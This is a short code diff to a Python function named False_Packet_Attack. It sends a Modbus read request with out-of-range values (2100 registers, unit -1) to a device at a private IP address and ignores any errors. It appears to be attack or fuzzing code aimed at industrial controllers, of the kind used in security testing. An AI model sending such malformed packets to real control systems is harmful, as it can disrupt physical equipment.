@@ -13,7 +13,7 @@ def False_Packet_Attack():
     client = ModbusClient('192.168.1.230')
     client.connect()
     try:
-        client.read_holding_registers(1, 2100, unit = 0)
+        client.read_holding_registers(300, 2100, unit = -1)
     except:
         pass
     
